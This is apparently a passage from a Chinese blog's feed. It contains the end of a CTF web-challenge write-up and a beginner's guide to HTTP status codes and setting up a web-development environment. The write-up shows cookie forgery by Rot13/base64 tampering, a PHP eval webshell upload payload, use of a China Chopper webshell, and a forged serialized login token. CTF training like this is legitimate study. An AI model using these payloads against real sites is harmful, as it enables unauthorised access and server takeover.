alt="PzypCV.md.png"></p><p>发现config.php和ctf.sql，flag应该存在数据库中，点开config.php可以看到数据库的信息</p><p><img src="https://i.loli.net/2018/09/03/5b8cfa6a6d4c5.png" alt=""></p><p>然后用菜刀编写shell连接到数据库查看flag。</p><h4 id="（4）broken"><a href="#（4）broken" class="headerlink" title="（4）broken"></a>（4）broken</h4><p>==hint：you got a file,but…==</p><p>点开链接，发现file是个超链接，点进去</p><p><img src="https://i.loli.net/2018/09/03/5b8d2f6f6b077.png" alt=""></p><p>一看jother编码，放进浏览器控制台，发现末尾少了一个]，加上后出现错误</p><p><img src="https://i.loli.net/2018/09/03/5b8d3098dff26.png" alt=""></p><p>于是删除最后面的()，再次输入得到[Array(1)]，打开就可以看到flag了。</p><h4 id="（5）who-are-you"><a href="#（5）who-are-you" class="headerlink" title="（5）who are you?"></a>（5）who are you?</h4><p>==hint：我是谁，我在哪，我要做什么？==</p><p>点开链接进去，显示</p><p><img src="https://i.loli.net/2018/09/03/5b8d386d864b0.png" alt=""></p><p>然后抓包发现cookie参数有问题</p><p><img src="https://i.loli.net/2018/09/03/5b8d38a85a2fb.png" alt=""></p><p>猜测是base64编码，拿去解码得</p><p><img src="https://i.loli.net/2018/09/03/5b8d390189eb1.png" alt=""></p><p>是Rot13，运行脚本解码得到guest，尝试将guest换成admin用脚本进行Rot13加密得到Zjo1OiJucXp2YSI7，再重新放入cookie中</p><p><img src="https://i.loli.net/2018/09/03/5b8d39de575a8.png" alt=""></p><p>可以看到已经成功登陆并且说可以上传，旁边有一条注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $filename = $_POST[&apos;filename&apos;]; $data = $_POST[&apos;data&apos;]; --&gt;</span><br></pre></td></tr></table></figure><p>所以将请求包改成POST形式，然后输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=2.php&amp;data[]=&lt;?php eval($_POST[&apos;a&apos;]);?&gt;</span><br></pre></td></tr></table></figure><p>再次提交</p><p><img src="https://i.loli.net/2018/09/03/5b8d39cbbb1ba.png" alt=""></p><p>找到路径，输入进去看看就可以得到flag。</p><h4 id="（6）Login"><a href="#（6）Login" class="headerlink" title="（6）Login"></a>（6）Login</h4><p>==hint：加油，我看好你==</p><p>点开链接，是一个登录界面</p><p><img src="https://i.loli.net/2018/09/04/5b8df38fd1ab5.png" alt=""></p><p>做web题习惯性的点开页面源代码看，发现一行注释，虽然在页面下面</p><p><img src="https://i.loli.net/2018/09/04/5b8df3ede8efd.png" alt=""></p><p>猜测是账号密码，输入登录发现成功登录，然而登录了并没有什么东西，抓包看看</p><p><img src="https://i.loli.net/2018/09/04/5b8df4aa946e2.png" alt=""></p><p>发现member.php这页刷新返回包中有一个show参数，猜测可以show source，所以改包，加上一个show参数并设为1</p><p><img src="https://i.loli.net/2018/09/04/5b8df5a930d62.png" alt=""></p><p>发现真的出现了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line">$db = <span class="keyword">new</span> db();</span><br><span class="line">$row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span><br><span class="line"><span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"(╯‵□′)╯︵┴─┴ "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重要的就是这段,编写代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">'user'</span>=&gt;<span class="string">'ichunqiu'</span>);</span><br><span class="line">$a=base64_encode(gzcompress(serialize($a)));</span><br><span class="line"><span class="keyword">echo</span> $a</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行得到token</p><p><img src="https://i.loli.net/2018/09/04/5b8df71053d38.png" alt=""></p><p>然后放到cookie中提交就可以得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="CTF训练" scheme="http://yoursite.com/categories/CTF%E8%AE%AD%E7%BB%83/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>WEB开发快速入门（一）</title>
    <link href="http://yoursite.com/2018/09/16/web%E5%BC%80%E5%8F%91%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8(%E4%B8%80)/"/>
    <id>http://yoursite.com/2018/09/16/web开发快速入门(一)/</id>
    <published>2018-09-15T16:00:00.000Z</published>
    <updated>2018-10-08T11:41:36.718Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ps:该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82413891</span></span><br></pre></td></tr></table></figure><h4 id="1、HTTP状态码"><a href="#1、HTTP状态码" class="headerlink" title="1、HTTP状态码"></a>1、HTTP状态码</h4><p>对网站管理工作者来说有个词不陌生，HTTP状态码，它是用以表示网页服务器HTTP响应状态的3位数字代码。状态码的第一个数字代表了响应的五种状态之一。</p><p>　　==1XX系列==：指定客户端应相应的某些动作，代表请求已被接受，需要继续处理。由于 HTTP/1.0 协议中没有定义任何 1xx 状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送 1xx 响应。</p><p>　　==2XX系列==：代表请求已成功被服务器接收、理解、并接受。这系列中最常见的有200、201状态码。<br>　　200状态码：表示请求已成功，请求所希望的响应头或数据体将随此响应返回<br>　　201状态码：表示请求成功并且服务器创建了新的资源，且其 URI 已经随Location 头信息返回。假如需要的资源无法及时建立的话，应当返回 ‘202 Accepted’</p><p>　　202状态码：服务器已接受请求，但尚未处理</p><p>　　==3XX系列==：代表需要客户端采取进一步的操作才能完成请求，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的 Location 域中指明。这系列中最常见的有301、302状态码。<br>　　301状态码：被请求的资源已永久移动到新位置。服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。</p><p>　　302状态码：请求的资源临时从不同的URI响应请求，但请求者应继续使用原有位置来进行以后的请求</p><p>​        304自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 如果网页自请求者上次请求后再也没有更改过，您应将服务器配置为返回此响应(称为 If-Modified-Since HTTP 标头)。</p><p>　　==4XX系列==：表示请求错误。代表了客户端看起来可能发生了错误，妨碍了服务器的处理。常见有：401、404状态码。<br>　　401状态码：请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。<br>　　403状态码：服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。</p><p>　　404状态码：请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</p><p>　　==5xx系列==：代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。常见有500、503状态码。<br>　　500状态码：服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器的程序码出错时出现。<br>　　503状态码：由于临时的服务器维护或者过载，服务器当前无法处理请求。通常，这个是暂时状态，一段时间会恢复<br>　　了解基本SEO状态码，是SEO优化人员必备知识。HTTP状态码是服务器和客户端之间交流信息的语言。通过查看网站日志的HTTP码，我们可以清楚查看搜索引擎在网站的爬取情况。</p><h4 id="2、前后端分离"><a href="#2、前后端分离" class="headerlink" title="2、前后端分离"></a>2、前后端分离</h4><p>==前端==：整个页面显示以及页面的交互逻辑。用ajax和node作为交互。其中node作为中间层。</p><p>==后端==：提供api接口，利用redis保存session，与数据库交互。</p><p>==流程==：</p><p>​    （1）客户端（浏览器）向node请求页面交互。</p><p>​    （2）node向后端（这里用java）转发请求，java在发送请求到数据库。</p><p>​    （3）java返回结果给node，node返回页面，提供数据。</p><p>==前后端分离前端==：</p><p>​    前端可以不依赖后端，前端自己起一个服务，如果前端页面处理好，后端的API还没有提供，那么，前端可以用mock模拟数据。</p><p>这里出现一个问题，如果没有服务，单页面是不可以ajax请求数据，会出现跨域的问题。要么浏览器做跨域。所以这里用到node。</p><p>我们利用node的express开启一个本地服务器，利用node的 http-proxy-middleware 插件将客户端发送给node的请求发给真正后服务器。</p><h4 id="3、Node"><a href="#3、Node" class="headerlink" title="3、Node"></a>3、Node</h4><p>Node主要是为了分层开发，前端不需要知道后端是怎么提供数据，怎么操作。后端也不需要知道node是怎么操作，前端是怎么部署。前端可以利用node自己作处理。</p><p>Node本身有着异步,非阻塞I／o。在处理并发量比较大的数据请求上有很大的优势。</p><h4 id="4、基础环境配置"><a href="#4、基础环境配置" class="headerlink" title="4、基础环境配置"></a>4、基础环境配置</h4><p>（1）==JDK==</p><p>JDK(Java Development Kit) 是 Java 语言的软件开发工具包(SDK)。<br>SE(JavaSE)，standard edition，标准版，是我们通常用的一个版本，从JDK 5.0开始，改名为Java SE。<br>EE(JavaEE)，enterprise edition，企业版，使用这种JDK开发J2EE应用程序，从JDK 5.0开始，改名为Java EE。从2018年2月26日开始，J2EE改名为Jakarta EE [1-2]  。<br>ME(J2ME)，micro edition，主要用于移动设备、嵌入式设备上的java应用程序，从JDK 5.0开始，改名为Java ME。<br>没有JDK的话，无法编译Java程序（指java源码.java文件），如果想只运行Java程序（指class或jar或其它归档文件），要确保已安装相应的JRE。</p><p>（2）==Node==</p><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。 </p><p>（3）==Yarn==</p><p>Yarn是快速、可靠、安全的依赖管理工具。<br>快速：Yarn 缓存了每个下载过的包，所以再次使用时无需重复下载。 同时利用并行下载以最大化资源利用率，因此安装速度更快。<br>可靠：使用详细、简洁的锁文件格式和明确的安装算法，Yarn 能够保证在不同系统上无差异的工作<br>安全：在执行代码之前，Yarn 会通过算法校验每个安装包的完整性。</p><p>可以在命令行输入下面的命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br><span class="line">npm install -g yarn</span><br><span class="line">yarn config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>（4）==IDEA==</p><p>IDEA 全称IntelliJ IDEA，是用于java语言开发的集成环境（也可用于其他语言），IntelliJ在业界被公认为最好的java开发工具之一，尤其在智能代码助手、代码自动提示、重构、J2EE支持、Ant、JUnit、CVS整合、代码审查、 创新的GUI设计等方面的功能可以说是超常的。IDEA是JetBrains公司的产品。</p><p>（5）==Postman==</p><p>Postman 是一个很强大的 API调试、Http请求的工具，允许用户发送任何类型的 HTTP 请求，例如 GET，POST，HEAD，PUT、DELETE等，并且可以允许任意的参数和 Headers。</p><p>（6）==Xampp==</p><p>XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。</p><p>XAMPP 的确非常容易安装和使用：只需下载，解压缩，启动即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="Web开发" scheme="http://yoursite.com/categories/Web%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="WEB" scheme="http://yoursite.com/tags/WEB/"/>
    
  </entry>
  
</feed>
